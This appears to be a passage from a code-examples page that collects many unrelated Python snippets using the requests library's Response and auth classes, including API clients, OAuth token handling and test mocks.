        headers.contract_address = self.channel_client.context.channel_manager.address
        if channel is not None:
            headers.balance = str(channel.balance)
            headers.balance_signature = encode_hex(channel.balance_sig)
            headers.sender_address = channel.sender
            headers.receiver_address = channel.receiver
            headers.open_block = str(channel.block)

        headers = HTTPHeaders.serialize(headers)
        if 'headers' in requests_kwargs:
            headers.update(requests_kwargs['headers'])
            requests_kwargs['headers'] = headers
        else:
            requests_kwargs['headers'] = headers
        return requests.request(method, url, **requests_kwargs) 
**************************************
def _handle_bad_response(response: Response):
        try:
            error = response.json()
            raise OAuthError(response.status_code, error.get('error'), error.get('error_description'))
        except BaseException as ex:
            if type(ex) != OAuthError:
                _logger.exception(
                    '_handle_bad_response - error while getting error as json - %s - %s' % (type(ex), str(ex)))
                raise OAuthError(response.status_code, 'unknown_error', response.text)
            else:
                raise 
**************************************
def get(self, url: str, params: Optional[dict] = None, **kwargs) -> Response:
        kwargs['params'] = params
        return self._bearer_request(self._get_session().get, url, **kwargs) 
**************************************
def post(self, url: str, data: Optional[Any] = None, json: Optional[Any] = None, **kwargs) -> Response:
        kwargs['data'] = data
        kwargs['json'] = json
        return self._bearer_request(self._get_session().post, url, **kwargs) 
**************************************
def put(self, url: str, data: Optional[Any] = None, json: Optional[Any] = None, **kwargs) -> Response:
        kwargs['data'] = data
        kwargs['json'] = json
        return self._bearer_request(self._get_session().put, url, **kwargs) 
**************************************
def patch(self, url: str, data: Optional[Any] = None, json: Optional[Any] = None, **kwargs) -> Response:
        kwargs['data'] = data
        kwargs['json'] = json
        return self._bearer_request(self._get_session().patch, url, **kwargs) 
**************************************
def _bearer_request(self, method: Callable[[Any], Response], url: str, **kwargs) -> Response:
        headers = kwargs.get('headers', None)
        if headers is None:
            headers = dict()
            kwargs['headers'] = headers
        _logger.debug("_bearer_request on %s - %s" % (method.__name__, url))
        response = method(url, **kwargs)
        if self.refresh_token is not None and self._is_token_expired(response):
            self._refresh_token()
            return method(url, **kwargs)
        else:
            return response 
**************************************
def _is_token_expired(response: Response) -> bool:
        if response.status_code == HTTPStatus.UNAUTHORIZED.value:
            try:
                json_data = response.json()
                return json_data.get('error', '') == 'invalid_token'
            except BaseException:
                return False
        else:
            return False 
**************************************
def mock_response(mocker):
    response = mocker.Mock(spec=requests.Response)
    return MockResponse(response) 
**************************************
def raise_for_status(self):
        if hasattr(self, 'error') and self.error:
            raise self.error
        Response.raise_for_status(self) 
**************************************
def make_response(code, content):
    r = requests.Response()
    r.status_code = code
    if content is not None:
        r.raw = six.BytesIO(six.b(json.dumps(content)))
    return r 
**************************************
def test_location_google_wrong_output(self):
        """User passed location arg but google api gave not expected format"""
        with mock.patch('requests.get') as mock_get:
            mock_get.return_value = requests.Response()
            with mock.patch('requests.Response.json') as mock_json:
                mock_json.return_value = {"blaaa": "bla"}
                with self.assertRaises(RipeAtlasToolsException):
                    cmd = Command()
                    cmd.init_args(["--location", "blaaaa"])
                    cmd.run() 
**************************************
def test_location_arg(self):
        """User passed location arg"""
        with mock.patch('requests.get') as mock_get:
            mock_get.return_value = requests.Response()
            with mock.patch('requests.Response.json') as mock_json:
                mock_json.return_value = {"results": [
                    {"geometry": {"location": {"lat": 1, "lng": 2}}}]}
                cmd = Command()
                cmd.init_args(["--location", "blaaaa"])
                self.assertEquals(cmd.build_request_args(), {'radius': '1,2:15'}) 
**************************************
def test_location_arg_with_radius(self):
        """User passed location arg"""
        with mock.patch('requests.get') as mock_get:
            mock_get.return_value = requests.Response()
            with mock.patch('requests.Response.json') as mock_json:
                mock_json.return_value = {"results": [
                    {"geometry": {"location": {"lat": 1, "lng": 2}}}
                ]}
                cmd = Command()
                cmd.init_args(["--location", "blaaaa", "--radius", "4"])
                self.assertEquals(
                    cmd.build_request_args(),
                    {"radius": "1,2:4"}
                ) 
**************************************
def write_raw(self, resp: Union[bytes, requests.Response], filename: str) -> None:
        """Write raw response data into a file.

        .. versionadded:: 4.2.1"""
        self.log(filename, end=' ', flush=True)
        with open(filename, 'wb') as file:
            if isinstance(resp, requests.Response):
                shutil.copyfileobj(resp.raw, file)
            else:
                file.write(resp) 
**************************************
def details_from_http_error(response: requests.Response) -> str:
    try:
        response_json = response.json()
    # Requests raises a ValueError if the response is invalid JSON
    except ValueError:
        details = ""
    else:
        details = response_json.get("message")
    details = details.strip() if details else ""
    return details 
**************************************
def mock_response():
    mock = Mock(spec=requests.Response)
    mock.status_code = 404
    mock.raise_for_status.side_effect = requests.exceptions.HTTPError(
        "An HTTP error occurred."
    )
    return mock 
**************************************
def test_authenticate_sets_session_headers(mock_post, monkeypatch):
    mock_looker_version = Mock(spec=LookerClient.get_looker_release_version)
    mock_looker_version.return_value("1.2.3")
    monkeypatch.setattr(LookerClient, "get_looker_release_version", mock_looker_version)

    mock_post_response = Mock(spec=requests.Response)
    mock_post_response.json.return_value = {"access_token": "test_access_token"}
    mock_post.return_value = mock_post_response
    client = LookerClient(TEST_BASE_URL, TEST_CLIENT_ID, TEST_CLIENT_SECRET)
    assert client.session.headers == {"Authorization": f"token test_access_token"} 
**************************************
def http_request(self, method, endpoint, service_url=None, **kwargs):
        """
        Performs a HTTP request to the Nexus REST API on the specified
        endpoint.

        :param method: one of ``get``, ``put``, ``post``, ``delete``.
        :type endpoint: str
        :param endpoint: URI path to be appended to the service URL.
        :type endpoint: str
        :param service_url: override the default URL to use for the request,
            which is created by joining :attr:`rest_url` and ``endpoint``.
        :type service_url: str
        :param kwargs: as per :py:func:`requests.request`.
        :rtype: requests.Response
        """
        service_url = service_url or self.rest_url
        url = urljoin(service_url, endpoint)

        try:
            response = requests.request(
                method=method, auth=self.config.auth, url=url,
                verify=self.config.x509_verify, **kwargs)
        except requests.exceptions.ConnectionError as e:
            raise exception.NexusClientConnectionError(str(e)) from None

        if response.status_code == 401:
            raise exception.NexusClientInvalidCredentials(
                'Try running `nexus3 login`')

        return response 
**************************************
def http_get(self, endpoint):
        """
        Performs a HTTP GET request on the given endpoint.

        :param endpoint: name of the Nexus REST API endpoint.
        :type endpoint: str
        :rtype: requests.Response
        """
        return self.http_request('get', endpoint, stream=True) 
**************************************
def http_head(self, endpoint):
        """
        Performs a HTTP HEAD request on the given endpoint.

        :param endpoint: name of the Nexus REST API endpoint.
        :type endpoint: str
        :rtype: requests.Response
        """
        return self.http_request('head', endpoint) 
**************************************
def http_post(self, endpoint, **kwargs):
        """
        Performs a HTTP POST request on the given endpoint.

        :param endpoint: name of the Nexus REST API endpoint.
        :type endpoint: str
        :param kwargs: as per :py:func:`requests.request`.
        :rtype: requests.Response
        """
        return self.http_request('post', endpoint, **kwargs) 
**************************************
def http_put(self, endpoint, **kwargs):
        """
        Performs a HTTP PUT request on the given endpoint.

        :param endpoint: name of the Nexus REST API endpoint.
        :type endpoint: str
        :param kwargs: as per :py:func:`requests.request`.
        :rtype: requests.Response
        """
        return self.http_request('put', endpoint, **kwargs) 
**************************************
def test_headers(self):
        """https://httpbin.org/headers"""
        with self.app.test_client() as c:
            self.rv = c.get(
                self.url("/headers"),
                environ_base=env(),
                headers=headers(
                    accept_encoding="gzip, deflate, sdch, br",
                    others={
                        "Host": self.C.my_host_name,
                        "Referer": self.url("/extdomains/eu.httpbin.org/headers"),
                        "Cookie": "_ga=GA1.2.1161994079.1471765883",
                        "Hello-World": "love_luciaz",
                    }),
            )  # type: Response

            # 白盒检查
            parse_values = attributes(self.zmirror.parse)
            self.assertEqual("application/json", self.zmirror.parse.content_type, msg=self.dump())

            self.assertEqual(
                "gzip, deflate",
                self.zmirror.parse.client_header['accept-encoding'],
                msg=parse_values
            )
            self.assertEqual(
                "https://eu.httpbin.org/headers",
                self.zmirror.parse.client_header['referer'],
                msg=self.dump()
            )
            self.assertEqual(
                "love_luciaz",
                self.zmirror.parse.client_header['hello-world'],
                msg=self.dump()
            )
            self.assertEqual("httpbin.org", self.zmirror.parse.remote_domain, msg=self.dump())
            self.assertEqual("/headers", self.zmirror.parse.remote_path, msg=self.dump())

            remote_resp = self.zmirror.parse.remote_response  # type: requests.Response
            remote_resp_json = json.loads(remote_resp.text)  # type: dict
            self.assertEqual(self.C.target_domain, remote_resp_json['headers']['Host'], msg=self.dump())

            # 黑盒检查
            h = load_rv_json(self.rv)['headers']
            self.assertEqual(self.C.my_host_name, h['Host'], msg=self.dump())
            self.assertEqual(self.url("/extdomains/eu.httpbin.org/headers"), h['Referer'], msg=self.dump())
            self.assertEqual("_ga=GA1.2.1161994079.1471765883", h['Cookie'], msg=self.dump())
            self.assertEqual("love_luciaz", h['Hello-World'], msg=self.dump())
            self.assertEqual("gzip, deflate", h['Accept-Encoding'], msg=self.dump()) 
**************************************
def request(self, method, endpoint=None, data=None, headers=None):
        """
        Makes a *method* request to *endpoint* with *data* and *headers*.

        :param method: (:obj:`str`) String for the http method: GET, POST, PUT DELETE. Other methods are not supported.

        :param endpoint: (:obj:`str`, optional) String for the endpoint where the request aims. Remember, all endpoints
            refers to :any:`_URL`.

            If none, request will aim to :any:`_ENDPOINT`.

            Example: `'/api/user/demo/animelist/'`

        :param data: (:obj:`dict`, optional) Parameters to be included in the request.

            If none, no parameters will be sent.

        :param headers: (:obj:`dict`, optional) Headers to be included in the request.

            If none, default parameters will be used (see :any:`_headers`).

        :raise: See :any:`raise_from_response`

        :return: (:obj:`dict`) Response.
        """

        headers = headers or self._headers
        endpoint = endpoint or self._ENDPOINT
        data = dic_to_json(data)

        logger.debug('Resource request: %s %s' % (method, endpoint))
        logger.debug('Resource request body: %s' % str(data))
        logger.debug('Resource request headers: %s' % headers)

        response = self._pool.request(
            method,
            endpoint,
            body=data,
            headers=headers)
        raise_from_response(response)

        response = response_to_dic(response)
        logger.debug('Resource response: \n' + pprint.pformat(response))
        return response 
**************************************
def initiate(
        self,
        transport,
        stream,
        metadata,
        content_type,
        total_bytes=None,
        stream_final=True,
    ):
        """Initiate a resumable upload.

        By default, this method assumes your ``stream`` is in a "final"
        state ready to transmit. However, ``stream_final=False`` can be used
        to indicate that the size of the resource is not known. This can happen
        if bytes are being dynamically fed into ``stream``, e.g. if the stream
        is attached to application logs.

        If ``stream_final=False`` is used, :attr:`chunk_size` bytes will be
        read from the stream every time :meth:`transmit_next_chunk` is called.
        If one of those reads produces strictly fewer bites than the chunk
        size, the upload will be concluded.

        Args:
            transport (~requests.Session): A ``requests`` object which can
                make authenticated requests.
            stream (IO[bytes]): The stream (i.e. file-like object) that will
                be uploaded. The stream **must** be at the beginning (i.e.
                ``stream.tell() == 0``).
            metadata (Mapping[str, str]): The resource metadata, such as an
                ACL list.
            content_type (str): The content type of the resource, e.g. a JPEG
                image has content type ``image/jpeg``.
            total_bytes (Optional[int]): The total number of bytes to be
                uploaded. If specified, the upload size **will not** be
                determined from the stream (even if ``stream_final=True``).
            stream_final (Optional[bool]): Indicates if the ``stream`` is
                "final" (i.e. no more bytes will be added to it). In this case
                we determine the upload size from the size of the stream. If
                ``total_bytes`` is passed, this argument will be ignored.

        Returns:
            ~requests.Response: The HTTP response returned by ``transport``.
        """
        method, url, payload, headers = self._prepare_initiate_request(
            stream,
            metadata,
            content_type,
            total_bytes=total_bytes,
            stream_final=stream_final,
        )
        response = _helpers.http_request(
            transport,
            method,
            url,
            data=payload,
            headers=headers,
            retry_strategy=self._retry_strategy,
        )
        self._process_initiate_response(response)
        return response 
**************************************
def resolve_remote(self, uri):
        """
        Resolve a remote ``uri``.

        If called directly, does not check the store first, but after
        retrieving the document at the specified URI it will be saved in
        the store if :attr:`cache_remote` is True.

        .. note::

            If the requests_ library is present, ``jsonschema`` will use it to
            request the remote ``uri``, so that the correct encoding is
            detected and used.

            If it isn't, or if the scheme of the ``uri`` is not ``http`` or
            ``https``, UTF-8 is assumed.

        :argument str uri: the URI to resolve
        :returns: the retrieved document

        .. _requests: http://pypi.python.org/pypi/requests/

        """

        scheme = urlsplit(uri).scheme

        if scheme in self.handlers:
            result = self.handlers[scheme](uri)
        elif (
            scheme in [u"http", u"https"] and
            requests and
            getattr(requests.Response, "json", None) is not None
        ):
            # Requests has support for detecting the correct encoding of
            # json over http
            if callable(requests.Response.json):
                result = requests.get(uri).json()
            else:
                result = requests.get(uri).json
        else:
            # Otherwise, pass off to urllib and assume utf-8
            result = json.loads(urlopen(uri).read().decode("utf-8"))

        if self.cache_remote:
            self.store[uri] = result
        return result 
**************************************
def query_nexus(query_url, timeout_sec, basic_auth=None):
    """Queries Nexus for an artifact

    :param query_url: (str) Query URL
    :param timeout_sec: (int) query timeout
    :param basic_auth (HTTPBasicAuth) object or none
    :return: requests.Response object
    :raises: RuntimeError
    """
    log = logging.getLogger(mod_logger + '.query_nexus')

    # Attempt to query Nexus
    retry_sec = 5
    max_retries = 6
    try_num = 1
    query_success = False
    nexus_response = None
    while try_num <= max_retries:
        if query_success:
            break
        log.debug('Attempt # {n} of {m} to query the Nexus URL: {u}'.format(n=try_num, u=query_url, m=max_retries))
        try:
            nexus_response = requests.get(query_url, auth=basic_auth, stream=True, timeout=timeout_sec)
        except requests.exceptions.Timeout:
            _, ex, trace = sys.exc_info()
            msg = '{n}: Nexus initial query timed out after {t} seconds:\n{e}'.format(
                n=ex.__class__.__name__, t=timeout_sec, r=retry_sec, e=str(ex))
            log.warn(msg)
            if try_num < max_retries:
                log.info('Retrying query in {t} sec...'.format(t=retry_sec))
                time.sleep(retry_sec)
        except (requests.exceptions.RequestException, requests.exceptions.ConnectionError):
            _, ex, trace = sys.exc_info()
            msg = '{n}: Nexus initial query failed with the following exception:\n{e}'.format(
                n=ex.__class__.__name__, r=retry_sec, e=str(ex))
            log.warn(msg)
            if try_num < max_retries:
                log.info('Retrying query in {t} sec...'.format(t=retry_sec))
                time.sleep(retry_sec)
        else:
            query_success = True
        try_num += 1

    if not query_success:
        msg = 'Unable to query Nexus after {m} attempts using URL: {u}'.format(
            u=query_url, m=max_retries)
        log.error(msg)
        raise RuntimeError(msg)

    if nexus_response.status_code != 200:
        msg = 'Nexus request returned code {c}, unable to query Nexus using URL: {u}'.format(
            u=query_url, c=nexus_response.status_code)
        log.error(msg)
        raise RuntimeError(msg)
    return nexus_response 
**************************************
def resolve_remote(self, uri):
        """
        Resolve a remote ``uri``.

        Does not check the store first, but stores the retrieved document in
        the store if :attr:`RefResolver.cache_remote` is True.

        .. note::

            If the requests_ library is present, ``jsonschema`` will use it to
            request the remote ``uri``, so that the correct encoding is
            detected and used.

            If it isn't, or if the scheme of the ``uri`` is not ``http`` or
            ``https``, UTF-8 is assumed.

        :argument str uri: the URI to resolve
        :returns: the retrieved document

        .. _requests: http://pypi.python.org/pypi/requests/

        """

        scheme = urlsplit(uri).scheme

        if scheme in self.handlers:
            result = self.handlers[scheme](uri)
        elif (
            scheme in [u"http", u"https"] and
            requests and
            getattr(requests.Response, "json", None) is not None
        ):
            # Requests has support for detecting the correct encoding of
            # json over http
            if callable(requests.Response.json):
                result = requests.get(uri).json()
            else:
                result = requests.get(uri).json
        else:
            # Otherwise, pass off to urllib and assume utf-8
            result = json.loads(urlopen(uri).read().decode("utf-8"))

        if self.cache_remote:
            self.store[uri] = result
        return result 

Python requests.auth() Examples

**************************************
def login(self):
        HEADERS = {
            'Ubi-AppId': UBI_APP_ID,
            'Content-Type': 'application/json; charset=UTF-8',
            'User-Agent': 'Mozilla/5.0',
            'Ubi-LocaleCode': 'en-US',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        payload = {'rememberMe': 'true'}
        r = requests.post(LOGIN_URL, headers=HEADERS, auth=HTTPBasicAuth(self.SECRET_USERNAME, self.SECRET_PASSWORD), json=payload)
        if r.status_code == 200:
            self.session = json.loads(r.text)
            f = open('info.txt', 'w')
            json.dump(r.json(), f)
            f.close()
            print('INFO: Created a new session successfully.')
            self.connected = True
            return True
        else:
            #raise Exception('ERROR: Login request failed:')
            print(r)
            print(type(r))
            pprint.pprint(r.text)
            self.connected = False
            return False 
**************************************
def setAuthMethod(self, auth_method):
        "Set the authentication method to use for the requests."
        self.auth_method = auth_method
        if len(self.auth_credentials) == 2:
            username, password = self.auth_credentials
            if self.auth_method == "basic":
                from requests.auth import HTTPBasicAuth
                self.h.auth = HTTPBasicAuth(username, password)
            elif self.auth_method == "digest":
                from requests.auth import HTTPDigestAuth
                self.h.auth = HTTPDigestAuth(username, password)
            elif self.auth_method == "ntlm":
                from requests_ntlm import HttpNtlmAuth
                self.h.auth = HttpNtlmAuth(username, password)
        elif self.auth_method == "kerberos":
            from requests_kerberos import HTTPKerberosAuth
            self.h.auth = HTTPKerberosAuth() 
**************************************
def __init__(self):

        self.buyorder = None
        self.sellorder = None

        self.endpoint = "https://api.exchange.coinbase.com"
        #self.endpoint = "http://demo-api.hitbtc.com"

        # Live Keys
        self.api_key = ""
        self.secret = ""
        self.passphrase = ""

        self.auth = CoinbaseExchangeAuth(self.api_key, self.secret, self.passphrase)

        self.logger = FileLogger("coinbase-orderbook") 
**************************************
def import_project(project, opts):
    u = opts.scheme + '://' + opts.host + _api + opts.project_id
    r = requests.patch(
            url=u,
            auth=HTTPBasicAuth(opts.username, opts.password),
            data=json.dumps(project),
            headers={'Content-Type': 'application/json'},
            verify=not (opts.insecure_skip_verify and opts.insecure_skip_verify))

    rjson = r.json()
    ret = dict(lair_response)
    ret['status'] = rjson['Status']
    ret['message'] = rjson['Message']

    return ret

# Function that performs project export. Returns a json string 
**************************************
def __init__(self, base_url, *args, **kwargs):
        requests.Session.__init__(self, *args, **kwargs)

        self.base_url = base_url
        
        # Check for basic authentication
        parsed_url = urlparse(self.base_url)
        if parsed_url.username and parsed_url.password:
            netloc = parsed_url.hostname
            if parsed_url.port:
                netloc += ":%d" % parsed_url.port
            
            # remove username and password from the base_url
            self.base_url = urlunparse((parsed_url.scheme, netloc, parsed_url.path, parsed_url.params, parsed_url.query, parsed_url.fragment))
            # configure requests to use basic auth
            self.auth = HTTPBasicAuth(parsed_url.username, parsed_url.password) 
**************************************
def _request_data(self, url):
        try:
            if set(["COUCHBASE_USERNAME","COUCHBASE_PASSWORD"]).issubset(os.environ):
                response = requests.get(url, auth=HTTPBasicAuth(os.environ["COUCHBASE_USERNAME"], os.environ["COUCHBASE_PASSWORD"]))
            else:
                response = requests.get(url)
        except Exception as e:
            print('Failed to establish a new connection. Is {0} correct?'.format(self.BASE_URL))
            sys.exit(1)

        if response.status_code != requests.codes.ok:
            print('Response Status ({0}): {1}'.format(response.status_code, response.text))
            sys.exit(1)

        result = response.json()
        return result 
**************************************
def setAuthMethod(self, auth_method):
        "Set the authentication method to use for the requests."
        self.auth_method = auth_method
        if len(self.auth_credentials) == 2:
            username, password = self.auth_credentials
            if self.auth_method == "basic":
                from requests.auth import HTTPBasicAuth
                self.h.auth = HTTPBasicAuth(username, password)
            elif self.auth_method == "digest":
                from requests.auth import HTTPDigestAuth
                self.h.auth = HTTPDigestAuth(username, password)
            elif self.auth_method == "ntlm":
                from requests_ntlm import HttpNtlmAuth
                self.h.auth = HttpNtlmAuth(username, password)
        elif self.auth_method == "kerberos":
            from requests_kerberos import HTTPKerberosAuth
            self.h.auth = HTTPKerberosAuth() 
**************************************
def send_request(self, commands, method='cli', timeout=30):
        """
        Send a HTTP/HTTPS request containing the JSON-RPC payload, headers, and username/password.

        method = cli for structured data response
        method = cli_ascii for a string response (still in JSON-RPC dict, but in 'msg' key)
        """
        timeout = int(timeout)
        payload_list = self._build_payload(commands, method)
        response = requests.post(self.url,
                                 timeout=timeout,
                                 data=json.dumps(payload_list),
                                 headers=self.headers,
                                 auth=HTTPBasicAuth(self.username, self.password),
                                 verify=self.verify)
        response_list = json.loads(response.text)

        if isinstance(response_list, dict):
            response_list = [response_list]

        # Add the 'command' that was executed to the response dictionary
        for i, response_dict in enumerate(response_list):
            response_dict['command'] = commands[i]
        return response_list 
**************************************
def __find_rows(self, find_url, **attributes):
        """
            :param find_url: URL of the find api
            :type find_url: string
            :return: The Response returned by requests including the list of documents based on find_url
            :rtype: Response object
        """
        req = self.url + find_url

        # Add range and sort parameters
        params = {
            "range": attributes.get("range", "all"),
            "sort": attributes.get("sort", [])
        }

        # Add body
        data = {
            "query": attributes.get("query", {})
        }

        try:
            return requests.post(req, params=params, json=data, proxies=self.proxies, auth=self.auth, verify=self.cert)
        except requests.exceptions.RequestException as e:
            sys.exit("Error: {}".format(e)) 
**************************************
def create_case_task(self, case_id, case_task):

        """
        :param case_id: Case identifier
        :param case_task: TheHive task
        :type case_task: CaseTask defined in models.py
        :return: TheHive task
        :rtype: json

        """

        req = self.url + "/api/case/{}/task".format(case_id)
        data = case_task.jsonify()

        try:
            return requests.post(req, headers={'Content-Type': 'application/json'}, data=data, proxies=self.proxies, auth=self.auth, verify=self.cert)
        except requests.exceptions.RequestException as e:
            sys.exit("Error: {}".format(e)) 
**************************************
def create_task_log(self, task_id, case_task_log):

        """
        :param task_id: Task identifier
        :param case_task_log: TheHive log
        :type case_task_log: CaseTaskLog defined in models.py
        :return: TheHive log
        :rtype: json
        """

        req = self.url + "/api/case/task/{}/log".format(task_id)
        data = {'_json': json.dumps({"message":case_task_log.message})}

        if case_task_log.file:
            f = {'attachment': (os.path.basename(case_task_log.file), open(case_task_log.file, 'rb'))}
            try:
                return requests.post(req, data=data,files=f, proxies=self.proxies, auth=self.auth, verify=self.cert)
            except requests.exceptions.RequestException as e:
                sys.exit("Error: {}".format(e))

        else:
            try:
                return requests.post(req, headers={'Content-Type': 'application/json'}, data=json.dumps({'message':case_task_log.message}), proxies=self.proxies, auth=self.auth, verify=self.cert)
            except requests.exceptions.RequestException as e:
                sys.exit("Error: {}".format(e)) 
**************************************
def runSearchJob(self, url, appname, headers, auth, username, earliest_time):
        url = url + "/servicesNS/-/%s/search/jobs" % (appname)
        query = "savedsearch \"Splunk Version Control Audit Query POST\" username=\"%s\" | stats count | where count>0" % (username)
        logger.debug("Running requests.post() on url=%s query=\"%s\"" % (url, query))
        data = { "search" : query, "output_mode" : "json", "exec_mode" : "oneshot", "earliest_time" : earliest_time }
         
        res = requests.post(url, auth=auth, headers=headers, verify=False, data=data)
        if (res.status_code != requests.codes.ok):
            logger.error("url=%s status_code=%s reason=%s, response=\"%s\"" % (url, res.status_code, res.reason, res.text))
            return { "error": "url=%s status_code=%s reason=%s, response=\"%s\"" % (url, res.status_code, res.reason, res.text) } 
        res = json.loads(res.text)
        
        #Log return messages from Splunk, often these advise of an issue but not always...
        if len(res["messages"]) > 0:
            firstMessage = res["messages"][0]
            if 'type' in firstMessage and firstMessage['type'] == "INFO":
                #This is a harmless info message ,most other messages are likely an issue
                logger.info("messages from query=\"%s\" were messages=\"%s\"" % (query, res["messages"]))
            else:
                logger.warn("messages from query=\"%s\" were messages=\"%s\"" % (query, res["messages"]))
        return res 
**************************************
def __build_auth_kwargs(self, **kwargs):
        """Setup authentication for requests

        If `access_token` is given, it is used in Authentication header.
        Otherwise basic auth is used with the client credentials.
        """

        if "access_token" in kwargs:
            headers = self.get_auth_headers(kwargs["access_token"])

            if "headers" in kwargs:
                headers.update(kwargs["headers"])

            kwargs["headers"] = headers
            del kwargs["access_token"]
        elif "auth" not in kwargs:
            kwargs["auth"] = HTTPBasicAuth(self.client_id, self.client_secret)

        return kwargs 
**************************************
def _execute(self, results: TestResultSet) -> Generator[events.ExecutionEvent, None, None]:
        auth = get_requests_auth(self.auth, self.auth_type)
        with get_session(auth, self.headers) as session:
            for endpoint, test in self.schema.get_all_tests(network_test, self.hypothesis_settings, self.seed):
                for event in run_test(
                    self.schema,
                    endpoint,
                    test,
                    self.checks,
                    results,
                    session=session,
                    request_timeout=self.request_timeout,
                ):
                    yield event
                    if isinstance(event, events.Interrupted):
                        return 
**************************************
def thread_task(
    tasks_queue: Queue,
    events_queue: Queue,
    schema: BaseSchema,
    checks: Iterable[Callable],
    settings: hypothesis.settings,
    auth: Optional[RawAuth],
    auth_type: Optional[str],
    headers: Optional[Dict[str, Any]],
    seed: Optional[int],
    results: TestResultSet,
    kwargs: Any,
) -> None:
    """A single task, that threads do.

    Pretty similar to the default one-thread flow, but includes communication with the main thread via the events queue.
    """
    # pylint: disable=too-many-arguments
    prepared_auth = get_requests_auth(auth, auth_type)
    with get_session(prepared_auth, headers) as session:
        _run_task(
            network_test, tasks_queue, events_queue, schema, checks, settings, seed, results, session=session, **kwargs
        ) 
**************************************
def do_post(self, urlpath: str, data: Union[bytes, MutableMapping[str, str], IO[Any], None] = None,
                params: Optional[Dict[str, str]] = None,
                files: Union[
                    Dict[str, IO],
                    Dict[str, Tuple[str, Union[IO, BinaryIO], Optional[str], Optional[Dict[str, str]]]],
                    Dict[str, Tuple[str, str]],
                    Sequence[Tuple[str, Union[IO, BinaryIO]]],
                    Sequence[Tuple[str, Union[IO, BinaryIO], Optional[str], Optional[Dict[str, str]]]],
                    None
                ] = None,
                json: Optional[MutableMapping[Any, Any]] = None) -> requests.Response:
        resp = requests.post(self._make_url(urlpath), data=data, params=params, files=files, json=json,
                             verify=self.ssl_verify, cert=self.ssl_cert, auth=self.http_auth,
                             timeout=self.timeout)

        if resp.status_code < 200 or resp.status_code >= 300:
            raise AptlyAPIException(self._error_from_response(resp), status_code=resp.status_code)

        return resp 
**************************************
def do_put(self, urlpath: str, data: Union[bytes, MutableMapping[str, str], IO[Any]] = None,
               files: Union[
                   Dict[str, IO],
                   Dict[str, Tuple[str, IO, Optional[str], Optional[Dict[str, str]]]],
                   Dict[str, Tuple[str, str]],
                   Sequence[Tuple[str, IO]],
                   Sequence[Tuple[str, IO, Optional[str], Optional[Dict[str, str]]]],
                   None
               ] = None,
               json: Optional[MutableMapping[Any, Any]] = None) -> requests.Response:
        resp = requests.put(self._make_url(urlpath), data=data, files=files, json=json,
                            verify=self.ssl_verify, cert=self.ssl_cert, auth=self.http_auth,
                            timeout=self.timeout)

        if resp.status_code < 200 or resp.status_code >= 300:
            raise AptlyAPIException(self._error_from_response(resp), status_code=resp.status_code)

        return resp 
**************************************
def get_token( client_id, secret ) :
    """Gets Authorizaton token to use in other requests."""
    auth_url  = 'https://auth-api.lexisnexis.com/oauth/v2/token'
    payload   = ( 'grant_type=client_credentials&scope=http%3a%2f%2f' 'oauth.lexisnexis.com%2fall' )
    headers   = { 'Content-Type': 'application/x-www-form-urlencoded' }
    r         = requests.post( auth_url, auth=HTTPBasicAuth( client_id, secret ), headers=headers, data=payload )
    json_data = r.json()
    return json_data[ 'access_token' ] 
**************************************
def get_token( client_id, secret ) :
    """Gets Authorizaton token to use in other requests."""
    auth_url  = 'https://auth-api.lexisnexis.com/oauth/v2/token'
    payload   = ( 'grant_type=client_credentials&scope=http%3a%2f%2f' 'oauth.lexisnexis.com%2fall' )
    headers   = { 'Content-Type': 'application/x-www-form-urlencoded' }
    r         = requests.post( auth_url, auth=HTTPBasicAuth( client_id, secret ), headers=headers, data=payload )
    json_data = r.json()
    return json_data[ 'access_token' ] 
**************************************
def api_submit(request, user=None, password=None):

    # Fetch the list of deploys for the application
    # This becomes the api call
    api_url = (api_protocol
               + '://'
               + api_host
               + request)

    if user:
        logging.info('Submitting data to API: %s' % api_url)
        r = requests.put(api_url, verify=verify_ssl, auth=HTTPBasicAuth(user, password))
    else:
        logging.info('Requesting data from API: %s' % api_url)
        r = requests.get(api_url, verify=verify_ssl)

    if r.status_code == requests.codes.ok:

        logging.debug('Response data: %s' % r.json())
        return r.json()

    elif r.status_code == requests.codes.conflict:

        logging.info('Artifact location/revision combination '
                     'is not unique. Nothing to do.')

        logging.info('twoni-plete')
        print ""
        sys.exit(0)

    else:

        logging.error('There was an error querying the API: '
                      'http_status_code=%s,reason=%s,request=%s'
                      % (r.status_code, r.reason, api_url))
        logging.info('twoni-plete')
        print ""
        sys.exit(2) 
**************************************
def jenkins_post(url, config_xml):

    try:

        log.info('Posting data to jenkins: %s' % url)
        headers = {'Content-Type': 'text/xml'}
        auth = HTTPBasicAuth(jenkins_user, jenkins_pass)
        r = requests.post(url, verify=False, headers=headers, auth=auth, data=config_xml)
    
        if r.status_code == requests.codes.ok:
            log.info('Success: %s' % r.status_code)
            return r
        else:
            msg = 'There was an error posting to Jenkins: http_status_code={0}s,reason={1},request={2}'.format(r.status_code, r.reason, url)
            log.error(msg)
            raise Exception(msg)

    except Exception, e:
        msg = 'Failed to create jenkins conf job: {0}'.format(e)
        log.error(msg)
        raise Exception(msg) 
**************************************
def sendSignedGetRequest(self, uri, raw=False):
        r = requests.get(self.endpoint + uri, auth=self.auth)

        if raw:
            return r.json(), r
        else:
            return r.json() 
**************************************
def sendSignedDeleteRequest(self, uri):
        r = requests.delete(self.endpoint + uri, auth=self.auth) 
**************************************
def sendSignedPostRequest(self, uri, data):
        r = requests.post(self.endpoint + uri, json=data, auth=self.auth)
        return r.json() 
**************************************
def poll(self):
        self.logger.debug("Polling url '%s'", self.url)
        reply = requests.get(self.url, auth=HTTPBasicAuth(self.user, self.password))
        if reply.status_code != requests.codes.ok:  # pylint: disable=no-member
            raise PollingError(
                "Code {code}: {error}".format(code=reply.status_code, error=reply.text)
            )

        try:
            return reply.json()
        except ValueError:
            # No valid json, try text
            return reply.text 
**************************************
def get_auth(self, username, password):
        return requests.auth.HTTPBasicAuth(username, password) 
**************************************
def get_auth(self, username, password):
        return requests.auth.HTTPDigestAuth(username, password) 
**************************************
def __init__(self, key, b64secret, passphrase,
                 api_url="https://api.pro.coinbase.com"):
        """ Create an instance of the AuthenticatedClient class.

        Args:
            key (str): Your API key.
            b64secret (str): The secret key matching your API key.
            passphrase (str): Passphrase chosen when setting up key.
            api_url (Optional[str]): API URL. Defaults to cbpro API.
        """
        super(AuthenticatedClient, self).__init__(api_url)
        self.auth = CBProAuth(key, b64secret, passphrase)
        self.session = requests.Session() 
**************************************
def get_access_token(consumer_key, consumer_secret):
    # Validate the app 
